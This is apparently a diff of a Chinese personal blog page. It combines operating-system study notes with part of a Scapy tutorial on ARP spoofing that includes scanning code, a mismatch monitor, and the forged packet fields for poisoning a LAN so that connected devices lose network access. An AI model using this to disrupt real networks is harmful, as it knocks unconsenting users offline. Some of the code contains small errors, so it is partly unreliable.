+<p>&emsp;&emsp;最后一点是关于文件系统的，文件系统规定了文件存储的格式，其同样封装了文件存储在磁盘上的细节，只留给用户图形接口来对文件进行wrx等操作，其内部实现了对文件的共享和保护，常见的文件系统有ext3、NFS、exfat等。</p>
+<p><img src="https://i.loli.net/2019/09/01/quN7jCBpW9IE2sU.png" alt="文件系统的框架.png"></p>
+<p>&emsp;&emsp;文件目录是一种数据结构，用于表示系统中的文件以及其物理地址，供检索时使用。文件目录实现了“按名存取”，“提高了对文件的检索速度”，“实现了文件共享”，“允许文件重名”，这一切主要通过定义它的数据结构FCB来控制。</p>
+<p>FCB主要信息：</p>
+<pre><code>基本信息：文件名、物理地址
+存取控制类：存取权限
+使用信息：建立时间、修改时间、打开文件的进程数</code></pre><p>&emsp;&emsp;文件描述信息单独形成一个称为索引结点的数据结构，在文件目录中，每个目录项仅由文件名和指向该文件名所对应的结点指针所构成，文件索引表：</p>
+<table>
+<thead>
+<tr>
+<th>文件名</th>
+<th>指针</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Name1</td>
+<td>Point1</td>
+</tr>
+<tr>
+<td>Name2</td>
+<td>Point2</td>
+</tr>
+<tr>
+<td>Name3</td>
+<td>Point3</td>
+</tr>
+</tbody></table>
+<p>&emsp;&emsp;这些索引表最终构成了简单的文件目录，单级文件目录、两级文件目录、树形目录结构。我们的文件、程序、应用等一系列的数据就存放在由格式化的文件系统构成的目录下，当程序执行时，磁盘通过算法读取到相应的信息，然后是内存调入(地址映射，重定向，分页管理，页面置换)，接着被处理机(CPU)执行，其间会产生很多中断，当执行完成之后，操作系统通过IO管理系统将结果发送到屏幕。</p>
+<p>&emsp;&emsp;然而，一切到这里才刚刚开始，这个操作系统的网络部分还没有浮出水面…..</p>
+<hr>
+<h2 id="文件管理系统应该实现按名存取"><a href="#文件管理系统应该实现按名存取" class="headerlink" title="文件管理系统应该实现按名存取"></a>文件管理系统应该实现按名存取</h2><ol>
+<li>文件存储空间的管理 – 分配和回收</li>
+<li>实现文件名到物理地址的映射</li>
+<li>实现对文件的操作–建立、删除、读写、目录</li>
+<li>实现文件共享和文件保护</li>
+<li>提供操作文件的接口、包括命令、程序、菜单</li>
+</ol>
+<h2 id="Operation-System安全机制"><a href="#Operation-System安全机制" class="headerlink" title="Operation System安全机制"></a>Operation System安全机制</h2><ol>
+<li>标识与鉴别</li>
+<li>访问控制</li>
+<li>最小权限管理</li>
+<li>可信通路</li>
+<li>安全审计</li>
+</ol>
+<h2 id="Questions！"><a href="#Questions！" class="headerlink" title="Questions！"></a>Questions！</h2><p>进程？</p>
+<pre><code>什么是进程？
+进程的特性？
+如何控制和产生一个进程？
+如何控制和调度多个进程？
+进程死锁怎么办，怎么避免？
+进程状态转换的本质是什么，进程转换过程中做了哪些操作？
+进程有哪些状态？
+进程为什么会状态转换？
+怎样避免多个进程运行的时候不产生混乱？
+什么是临界资源？进程如何访问临界资源？
+进程互斥算法？
+两个或者多个进程间如何通信？
+为什么要产生线程？
+线程和进程的区别？
+线程有哪些好处？
+什么是管程？
+为什么要引入管程，管程有哪些好处？</code></pre><p>CPU？</p>
+<pre><code>什么是CPU？CPU能干什么？
+什么是调度？调度有哪几种？
+什么时候进行调度？
+怎么调度？
+怎么评价一个调度算法的好坏？
+早起调度算法与交互式系统调度算法有什么区别？
+列举几种常见的CPU调度算法，并描述其实现机制？</code></pre><p>内存？</p>
+<pre><code>什么是内存？内存有什么用？
+一台电脑内存4G是什么意思？
+内存管理是如何完成地址映射的？
+程序是如何进入内存的？
+内存是如何分配和回收空间的？
+内存分配回收空间有哪几种算法，各个的优缺点是什么？
+内存的连续分配和非连续分配是什么？
+分页存储的基本原理？
+分页存储和分段存储有什么不同？
+用什么样的数据结构记录系统已经分配的内存、以及系统剩余的内存？
+内存空间的扩展是如何实现的？
+内存保护是什么？有什么作用？怎么实现的？怎么产生的？</code></pre><p>虚拟存储机制？</p>
+<pre><code>什么是虚拟存储？为什么会有虚拟存储？
+怎样实现虚拟存储？
+缺页中断是什么？
+页面是什么时候调入？
+页面是从哪里调入？
+如何评价一个页面置换算法的好坏？
+页面置换是如何置换的？
+页面置换的算法？
+什么是抖动和工作集？</code></pre><p>I/O系统？</p>
+<pre><code>为什么要有输入输出系统？
+输入输出系统是怎么产生的？
+I/O系统的层次结构模型是什么样的？
+设备控制器是什么？
+设备控制器有什么用？
+中断机构和中断处理程序？
+设备驱动程序是什么？
+缓冲区的引入有什么好处？
+有哪几种缓冲区？
+磁盘存储是什么？
+磁盘存放数据按照什么格式？机械硬盘是什么格式？固态硬盘是什么格式？
+U盘存储原理？
+怎样衡量一个磁盘调度算法？
+有哪些是磁盘调度算法？如何实现？</code></pre><p>文件管理系统？</p>
+<pre><code>为什么会产生文件系统？
+文件有什么数据结构？
+这些数据结构能支持文件完成哪些动作？
+什么是目录？
+为什么会产生目录？
+目录有什么样的数据结构？
+目录存放在磁盘的什么地方？
+文件和目录是怎么建立联系的？
+文件共享是如何实现的？
+文件保护是如何实现的？</code></pre><br>
+
+<hr>
+<br>
+
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>任何程序都必须满足结构性，以便于外部或内部对其rwx</p>
+
+            
+            <p class="more">
+                <a href="../../http:/ymlog.cn/2019/08/22/OS%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">阅读剩下更多</a>
+            </p>
+        </div>
+        <div class="post-thumbnail" data-img="">
+            <a href="http://ymlog.cn/2019/08/22/OS%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" title="OS操作系统">
+                
+                    <img class="thumbnail" src="../../img/default.png" data-echo="../../img/thumbnail/2.jpg" alt="默认配图" >
+                
+            </a>
+        </div>
+    </div>
+</article>
+
+    
+        <!-- 文章列表 item -->
+<article class="post">
+    <header>
+        <!-- 标签这有且只能显示一个 -->
+        
+            <a href="javascript: void(0);" class="cat">未分类</a>
+        
+        <!-- 文章标题 -->
+        
+    <h3 class="post-title">
+    	<a href="../../http:/ymlog.cn/2019/08/20/zen/">
+    		禅
+    	</a>
+    </h3>
+
+    </header>
+    <p class="post-meta">
+        Jelon 发表于
+        <time datetime="2019-08-19T16:00:00.000Z">2019-08-20</time>
+        &nbsp;&nbsp;
+        <span class="post-tags">
+            标签：
+            
+    
+        <a href="../../tags/%E9%9A%8F%E7%AC%94/" title="随笔">随笔</a>
+    
+
+        </span>
+    </p>
+
+    <div class="post-content">
+        <div class="post-excerpt">
+            
+                <p>&emsp;&emsp; 释迦牟尼原名乔达摩·悉达多，是古印度迦毗罗卫国（今尼泊尔）的太子，悉达多太子天资聪慧，长到12岁时，就已经掌握了当时印度最高的学问，16岁时，娶了表妹耶输陀罗为妻。</p>
+            
+            <p class="more">
+                <a href="../../http:/ymlog.cn/2019/08/20/zen/">阅读剩下更多</a>
+            </p>
+        </div>
+        <div class="post-thumbnail" data-img="">
+            <a href="http://ymlog.cn/2019/08/20/zen/" title="禅">
+                
+                    <img class="thumbnail" src="../../img/default.png" data-echo="../../img/thumbnail/0.jpg" alt="默认配图" >
+                
+            </a>
+        </div>
+    </div>
+</article>
+
+    
+        <!-- 文章列表 item -->
+<article class="post">
+    <header>
+        <!-- 标签这有且只能显示一个 -->
+        
+        <a class="cat-link" href="../../categories/%E7%BC%96%E7%A8%8B/">编程</a>
+        
+        <!-- 文章标题 -->
+        
+    <h3 class="post-title">
+    	<a href="../../http:/ymlog.cn/2019/07/27/Python%E5%AE%9E%E7%8E%B0ARP%E6%AC%BA%E9%AA%97%E5%B1%8F%E8%94%BD%E5%B1%80%E5%9F%9F%E7%BD%91/">
+    		Python实现ARP欺骗屏蔽局域网
+    	</a>
+    </h3>
+
+    </header>
+    <p class="post-meta">
+        Jelon 发表于
+        <time datetime="2019-07-27T12:20:53.000Z">2019-07-27</time>
+        &nbsp;&nbsp;
+        <span class="post-tags">
+            标签：
+            
+        </span>
+    </p>
+
+    <div class="post-content">
+        <div class="post-excerpt">
+            
+                <center>Arp欺骗 ---- Python实现</center>
 ## 简介
     1、ARP是地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP/IP协议。
-    2、当计算机知道IP...</p><div class="bloginfo"><ul><li class="author"><a href="/">ZEN</a></li><li class="lmname"><a href="../../categories/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="timer">2019-07-27 20:20:53</li><!--li.view--><!--    span 34567--><!--    | 已阅读--><!--li.like 9999--></ul></div></div><div data-scroll-reveal="enter bottom over 1s" class="blogs"><h3 class="blogtitle"><a href="../../2019/07/18/%E7%8E%A9%E8%BD%ACLinux/" target="_blank">玩转Linux</a></h3><span class="blogpic"><a href="../../2019/07/18/%E7%8E%A9%E8%BD%ACLinux/" title="玩转Linux"><img src="../../https:/i.loli.net/2020/03/22/sE8KITFZwU4bHer.png" alt=""></a></span><p class="blogtext">网络测速12345git clone https://github.com/sivel/speedtest-cli.gitcd speed* &amp;&amp; python speedtest.py#后接`--share`,可以生...</p><div class="bloginfo"><ul><li class="author"><a href="/">ZEN</a></li><li class="lmname"><a href="../../categories/Linux/">Linux</a></li><li class="timer">2019-07-18 12:53:27</li><!--li.view--><!--    span 34567--><!--    | 已阅读--><!--li.like 9999--></ul></div></div><div data-scroll-reveal="enter bottom over 1s" class="blogs"><h3 class="blogtitle"><a href="../../2019/05/03/Matplotlib%E5%9B%BE%E6%A0%87%E7%BB%98%E5%88%B6%E6%91%98%E8%A6%81/" target="_blank">Matplotlib图标绘制摘要</a></h3><span class="blogpic"><a href="../../2019/05/03/Matplotlib%E5%9B%BE%E6%A0%87%E7%BB%98%E5%88%B6%E6%91%98%E8%A6%81/" title="Matplotlib图标绘制摘要"><img src="../../https:/cn.bing.com/th?id=OIP.xIQ0vWl4azqWRj1otshahQHaD6&amp;pid=Api&amp;rs=1" alt=""></a></span><p class="blogtext">目录
-散点图：用于描述两个变量的相关性—–scatter折线图：多用于描述变量随时间的变化—–plot条形图:比较多个项目分类的数据大小直方图：表示数据的分布情况（连续）饼状图：显示各项大小与总和的比例箱型图：上边缘，上四分位数，中位...</p><div class="bloginfo"><ul><li class="author"><a href="/">ZEN</a></li><li class="lmname"><a href="../../categories/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="timer">2019-05-03 08:18:25</li><!--li.view--><!--    span 34567--><!--    | 已阅读--><!--li.like 9999--></ul></div></div></div><div class="pagelist"><a class="extend prev" rel="prev" href="../3/"><i class='iconfont icon-page-pre' ></i></a><a class="page-number" href="../../">1</a><a class="page-number" href="../2/">2</a><a class="page-number" href="../3/">3</a><span class="page-number current">4</span></div></main><aside class="r_box"><div class="card box"><h2>我的名片</h2><div class="box_con"><p>邮箱：2212585023@qq.com</p>
-</div></div><div class="category box"><h2>文章分类</h2><div class="box_con"><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="../../categories/Linux/">Linux</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="../../categories/%E4%B8%AD%E9%97%B4%E4%BB%B6/">中间件</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="../../categories/%E5%AE%B9%E5%99%A8/">容器</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="../../categories/%E6%95%85%E9%9A%9C/">故障</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="../../categories/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="../../categories/%E7%BC%96%E7%A8%8B/">编程</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="../../categories/%E8%B7%AF%E7%94%B1%E6%8A%80%E6%9C%AF/">路由技术</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="../../categories/%E8%BF%90%E7%BB%B4/">运维</a><span class="category-list-count">1</span></li></ul></div></div><div class="box recommend"><h2>推荐</h2><div class="box_con"><ul><li><a href="../../2019/10/20/Hexo%E5%8D%9A%E5%AE%A2%E6%9E%B6%E6%9E%84%E8%BF%81%E7%A7%BB%E5%8E%86%E5%8F%B2/">博客历史</a></li><li><a href="../../2019/06/06/%E6%84%BF%E6%9C%89%E6%B6%93%E6%B6%93%E8%AF%97%E6%84%8F%E6%B8%85%E6%96%B0%E5%85%A5%E8%84%BE%EF%BC%8C%E4%BB%A5%E9%A3%A8%E5%BF%99%E7%A2%8C%E7%9A%84%E6%97%A5%E5%B8%B8/">诗酒趁年华</a></li></ul></div></div><div class="tags box"><h2>标签</h2><div class="box_con"><ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="../../tags/%E5%BF%AB%E6%8D%B7%E9%94%AE/" rel="tag">快捷键</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../tags/%E6%91%98%E5%BD%95/" rel="tag">摘录</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../tags/%E9%9A%8F%E7%AC%94/" rel="tag">随笔</a></li></ul></div></div></aside></article><footer><section class="footer_bottom"><div class="footer_container"><p class="copyright">Design by
-<a href='http://ymlog.cn' target='_blank'>ZEN</a>
-苏ICP备19049121号-1
-</p><ul class="social_network"></ul></div></section></footer><div class="cd-top"><i class="iconfont icon-top"></i></div>
-<script src="../../js/jquery.min.js"></script>
-<script src="../../js/scrollreveal.js"></script>
-<script src="../../js/hc-sticky.js"></script>
-<script src="/js/canvas-nest.js" type="text/javascript" color="47,135,193" opacity="0.7" zIndex="-2" count="199"></script>
-<script src="../../js/common.js?v=202006181108.js"></script>
-<script src="../../js/index.js?v=202006181108.js"></script>
-</body></html>
+    2、当计算机知道IP地址和MAC地址，就会向局域网中发送信息，默认发给默认网关，如果是发到局域网外的信息，则用源主机IP+目的
+    这两点是构造ARP毒化攻击的基本原理。
+----
+    ARP毒化攻击可以干什么？
+        ARP毒化可以让局域网内的消息都发往你指定的网关，简而言之就是让本地局域网全部断网，让连接同一个WiFi的设备都上不了网。
+
+<hr>
+<pre><code>如何做到的？
+计算机、手机、Ipad上网的数据传输发包格式为：
+源IP--自己的IP
+源MAC--自己的物理地址
+目的IP--如180.101.49.12 == www.baidu.com
+目的MAC--本地局域网的默认网关MAC
+
+1、目标主机通过ARP广播(由此可见ARP是用UDP协议实现)得到默认网关MAC地址
+2、攻击者通过不断地发送(默认网关IP+非默认网关MAC)的形式，更改目标主机中的ARP缓存表
+3、目标主机向默认路由发送消息
+4、消息在局域网内传播，但不会通过MAC地址流入默认路由器，故默认路由器也不会转发目标主机的消息，目标主机断网。
+
+即通过ARP毒化，让目标主机不能通过ARP协议，完成正确的地址映射。</code></pre><hr>
+<pre><code>攻击者如何向目标主机发送(默认网关IP+非默认网关MAC)？
+通过Python3的Scapy库来实现。</code></pre><h2 id="1、Scapy工具介绍"><a href="#1、Scapy工具介绍" class="headerlink" title="1、Scapy工具介绍"></a>1、Scapy工具介绍</h2><p>scapy官方文档</p>
+<blockquote>
+<p><a href="https://scapy.readthedocs.io/en/latest/](https://scapy.readthedocs.io/en/latest/)" target="_blank" rel="noopener">https://scapy.readthedocs.io/en/latest/](https://scapy.readthedocs.io/en/latest/)</a></p>
+</blockquote>
+<pre><code>安装 pip install scapy</code></pre><p>Scapy可用于构造、发送、解析各类数据包。可以用来扫描，跟踪路由，探测，单元测试，攻击或网络发现。</p>
+<pre><code>默认包：以太网头部/IP头部/TCP头部
+pkg=Ehter()/IP()/TCP()
+pkg.show()</code></pre><p><strong>默认以太网头部</strong></p>
+<pre><code>###[ Ethernet ]### 
+dst= ff:ff:ff:ff:ff:ff
+src= 00:00:00:00:00:00
+type= IPv4</code></pre><p><strong>默认IP头部</strong></p>
+<pre><code>###[ IP ]### 
+     version= 4
+     ihl= None
+     tos= 0x0
+     len= None
+     id= 1
+     flags= 
+     frag= 0
+     ttl= 64
+     proto= tcp
+     chksum= None
+     src= 127.0.0.1
+     dst= 127.0.0.1
+     \options\</code></pre><p><strong>默认TCP头部</strong></p>
+<pre><code>###[ TCP ]### 
+        sport= ftp_data //默认20
+        dport= http            //默认80
+        seq= 0
+        ack= 0
+        dataofs= None
+        reserved= 0
+        flags= S
+        window= 8192
+        chksum= None
+        urgptr= 0
+        options= []</code></pre><h2 id="2、ARP协议简介"><a href="#2、ARP协议简介" class="headerlink" title="2、ARP协议简介"></a>2、ARP协议简介</h2><p>ARP协议实现IP（32bit）地址到MAC（48bit）地址之间的动态映射（由操作系统完成，用户不必关注），多路访问都会用到IP地址</p>
+<hr>
+<p><strong>实现的具体过程</strong></p>
+<pre><code>源主机发送ARP广播报文段，在报文段中填入自己的IP地址，目标的IP地址，以及自己的MAC地址
+
+同一个局域网内的主机都接受该报文段，并与自己的IP地址相比较
+如果相同，则发送ARP响应报文，在响应报文中填入自己的MAC地址等
+如果不同，则丢弃
+源主机接收到目标主机发出的ARP响应报文，放入ARP缓存表</code></pre><p><strong>scapy包结构</strong></p>
+<pre><code>###[ ARP ]### 
+        hwtype= 0x1         //硬件类型 1：Ethernet
+        ptype= IPv4            
+        hwlen= None
+        plen= None
+        op= who-has
+        hwsrc= 00:0c:29:ab:65:55    //hardware source 硬件源地址
+        psrc= 192.168.3.37                //源IP地址
+        hwdst= None                                //hardware destination 硬件目的地址
+        pdst= None                                //目的IP地址</code></pre><p><img src="https://i.loli.net/2019/08/30/DZQyihm8xXTkr5N.png" alt="ARP包结构"></p>
+<h2 id="3、Scapy实现ARP扫描"><a href="#3、Scapy实现ARP扫描" class="headerlink" title="3、Scapy实现ARP扫描"></a>3、Scapy实现ARP扫描</h2><pre><code>&apos;&apos;&apos;
+sr()  发一个，也可以接受好几个包
+sr1() 发一个包，可能会收到很多包，但我只接受第一个
+srp() 发多个，收多个，p代表工作在二层（以太网层）
+send() 只管发
+sendp() 需要手动填以太网的信息
+&apos;&apos;&apos;</code></pre><p>最基本的ARP请求响应</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">localmac=<span class="string">'00:0c:29:ab:65:55'</span></span><br><span class="line">localip=<span class="string">'192.168.3.37'</span></span><br><span class="line">destip=<span class="string">'192.168.3.31'</span></span><br><span class="line">destmac=destmac</span><br><span class="line"></span><br><span class="line">pkg=srp(Ether(src=localmac,dst=<span class="string">'FF:FF:FF:FF:FF:FF'</span>)/ARP(op=<span class="number">1</span>,hwsrc=localmac,hwdst=<span class="string">'00:00:00:00:00:00'</span>),iface=<span class="string">'ens32'</span>,verbose=<span class="literal">False</span>,timeout=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># op=1:ARP Request</span></span><br><span class="line"><span class="comment"># iface：网卡</span></span><br><span class="line"><span class="comment"># timeout:设置等待时间</span></span><br><span class="line"><span class="comment"># verbose：不打印输出</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="ARP响应的解析—Scapy——ARP数据结构分析"><a href="#ARP响应的解析—Scapy——ARP数据结构分析" class="headerlink" title="ARP响应的解析—Scapy——ARP数据结构分析"></a>ARP响应的解析—Scapy——ARP数据结构分析</h3><p><img src="https://i.loli.net/2019/08/30/gzkyjEhnPbaBd6R.jpg" alt="scapy发收包的数据结构"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;pkg</span><br><span class="line"><span class="comment"># (&lt;Results: TCP:0 UDP:0 ICMP:0 Other:1&gt;, &lt;Unanswered: TCP:0 UDP:0 ICMP:0 Other:0&gt;) //元祖</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;pkg[<span class="number">0</span>]	//选择响应的ARP包</span><br><span class="line"><span class="comment"># &lt;Results: TCP:0 UDP:0 ICMP:0 Other:1&gt;</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;pkg[<span class="number">0</span>].res //生成收发包的清单</span><br><span class="line"></span><br><span class="line"><span class="comment">#用列表容纳收发队列组成的元祖，对应一组计算机[</span></span><br><span class="line">第一个收发(</span><br><span class="line">	<span class="comment"># 发送的包&lt;Ether  dst=FF:FF:FF:FF:FF:FF src=00:0c:29:ab:65:55 type=ARP |&lt;ARP  op=who-has hwsrc=00:0c:29:ab:65:55 psrc=192.168.3.37 pdst=192.168.3.31 |&gt;&gt;,</span></span><br><span class="line">	<span class="comment"># 接受的包&lt;Ether  dst=00:0c:29:ab:65:55 src=58:00:e3:d7:d5:ef type=ARP |&lt;ARP  hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=is-at hwsrc=58:00:e3:d7:d5:ef psrc=192.168.3.31 hwdst=00:0c:29:ab:65:55 pdst=192.168.3.37 |&lt;Padding  load='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' |&gt;&gt;&gt;)]</span></span><br><span class="line"><span class="comment"># 元祖--包含了收发的所有包</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;pkg[<span class="number">0</span>].res[<span class="number">0</span>] //选择第一个收发的包</span><br><span class="line"><span class="comment">#就对应一个计算机(</span></span><br><span class="line">&lt;Ether  dst=FF:FF:FF:FF:FF:FF src=<span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:ab:<span class="number">65</span>:<span class="number">55</span> type=ARP |&lt;ARP  op=who-has hwsrc=<span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:ab:<span class="number">65</span>:<span class="number">55</span> psrc=<span class="number">192.168</span><span class="number">.3</span><span class="number">.37</span> pdst=<span class="number">192.168</span><span class="number">.3</span><span class="number">.31</span> |&gt;&gt;,</span><br><span class="line">&lt;Ether  dst=<span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:ab:<span class="number">65</span>:<span class="number">55</span> src=<span class="number">58</span>:<span class="number">00</span>:e3:d7:d5:ef type=ARP |&lt;ARP  hwtype=<span class="number">0x1</span> ptype=IPv4 hwlen=<span class="number">6</span> plen=<span class="number">4</span> op=<span class="keyword">is</span>-at hwsrc=<span class="number">58</span>:<span class="number">00</span>:e3:d7:d5:ef psrc=<span class="number">192.168</span><span class="number">.3</span><span class="number">.31</span> hwdst=<span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:ab:<span class="number">65</span>:<span class="number">55</span> pdst=<span class="number">192.168</span><span class="number">.3</span><span class="number">.37</span> |&lt;Padding  load=<span class="string">'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'</span> |&gt;&gt;&gt;</span><br><span class="line">)</span><br><span class="line">&gt;&gt;&gt;pkg[<span class="number">0</span>].res[<span class="number">0</span>][<span class="number">1</span>] //选择响应的那一部分</span><br><span class="line">&gt;&gt;&gt;pkg[<span class="number">0</span>].res[<span class="number">0</span>][<span class="number">1</span>][<span class="number">0</span>].fields//选择响应的那一部分的以太网头部</span><br><span class="line"><span class="comment">#&#123;'dst': '00:0c:29:ab:65:55', 'src': '58:00:e3:d7:d5:ef', 'type': 2054&#125;</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;pkg[<span class="number">0</span>].res[<span class="number">0</span>][<span class="number">1</span>][<span class="number">1</span>].fields //选择响应的那一部分的ARP头部</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	'hwtype': 1,</span></span><br><span class="line"><span class="string">	'ptype': 2048, </span></span><br><span class="line"><span class="string">	'hwlen': 6, </span></span><br><span class="line"><span class="string">	'plen': 4, </span></span><br><span class="line"><span class="string">	'op': 2, </span></span><br><span class="line"><span class="string">	'hwsrc': '58:00:e3:d7:d5:ef',</span></span><br><span class="line"><span class="string">	'psrc': '192.168.3.31', </span></span><br><span class="line"><span class="string">	'hwdst': '00:0c:29:ab:65:55', </span></span><br><span class="line"><span class="string">	'pdst': '192.168.3.37'</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">&gt;&gt;&gt;pkg[<span class="number">0</span>].res[<span class="number">0</span>][<span class="number">1</span>][<span class="number">1</span>].fields[<span class="string">'hwsrc'</span>]  //提取目标mac地址，也就是当前目标发包的源mac地址</span><br><span class="line">&gt;&gt;&gt;pkg[<span class="number">0</span>].res[<span class="number">0</span>][<span class="number">1</span>][<span class="number">1</span>].fields[<span class="string">'psrc'</span>]</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h2><blockquote>
+<p><a href="https://github.com/ArchKS/Python/tree/master/ArpSpoof" target="_blank" rel="noopener">https://github.com/ArchKS/Python/tree/master/ArpSpoof</a></p>
+</blockquote>
+<h2 id="4、Scapy监听ARP异常"><a href="#4、Scapy监听ARP异常" class="headerlink" title="4、Scapy监听ARP异常"></a>4、Scapy监听ARP异常</h2><ul>
+<li>建立正确的IP地址和MAC地址的映射数据库</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">'scapy.runtime'</span>).setLevel(logging.ERROR)<span class="comment">#清除报错</span></span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ARP_Table <span class="keyword">import</span> ARP_Table <span class="comment"># 导入合法的IP-MAC映射关系</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">arp_monitor_callback</span><span class="params">(pkt)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> ARP <span class="keyword">in</span> pkt <span class="keyword">and</span> pkt[ARP].op <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">2</span>):<span class="comment">#找到ARP数据包中操作码为1（who-has）或者2（is-at）的数据包）</span></span><br><span class="line">		<span class="keyword">if</span> ARP_Table.get(pkg[ARP].psrc):</span><br><span class="line">			<span class="keyword">if</span> ARP_Table[pkt[ARP].psrc] == pkt[ARP].hwsrc:</span><br><span class="line">				print(<span class="string">'IP地址：&#123;0&#125; MAC地址：&#123;1&#125; 匹配'</span>.format(pkt[ARP].psrc,pkt[ARP].hwsrc))</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				print(<span class="string">'IP地址：&#123;0&#125; MAC地址：&#123;1&#125; 不匹配'</span>.format(pkt[ARP].psrc,pkt[ARP].hwsrc))</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			print(<span class="string">'IP地址：&#123;0&#125; MAC地址：&#123;1&#125; 未找到条码'</span>.format(pkt[ARP].psrc,pkt[ARP].hwsrc))</span><br><span class="line">	<span class="comment">#捕获数据包，通过arp_monitor_callback方法进行处理，filter过滤arp数据包，store=0，不保存数据，iface指定接口</span></span><br><span class="line">	sniff(prn=arp_monitor_callback,filter=<span class="string">'arp'</span>,store=<span class="number">0</span>,iface=<span class="string">'ens32'</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="5、Scapy实现ARP的毒化攻击"><a href="#5、Scapy实现ARP的毒化攻击" class="headerlink" title="5、Scapy实现ARP的毒化攻击"></a>5、Scapy实现ARP的毒化攻击</h2><p>原理：</p>
+<p><img src="https://i.loli.net/2019/08/30/zKlWci79yTHxwQG.png" alt="攻击之前.png"></p>
+<p><img src="!%5B%E6%94%BB%E5%87%BB%E4%B9%8B%E5%90%8E.jpg%5D(https://i.loli.net/2019/08/30/rkwa8dRBtmoFWJT.jpg)" alt="攻击之后"></p>
+<p>所以，只需要修改A中的ARP缓存表，将与B对应的MAC修改。<br />于是，发给A的ARP响应报文格式应为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">目的IP：A</span><br><span class="line">目的MAC：A</span><br><span class="line">源IP：B</span><br><span class="line">源MAC：C</span><br></pre></td></tr></table></figure>
+
+<p>就能实现上图功能。<br />紧接着，如果B要发消息给A，那么A中的ARP表可能会调整回正确的，于是可以向B发送ARP报文，格式为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">目的IP：B</span><br><span class="line">目的MAC：B</span><br><span class="line">源IP：A</span><br><span class="line">源MAC：C</span><br></pre></td></tr></table></figure>
+
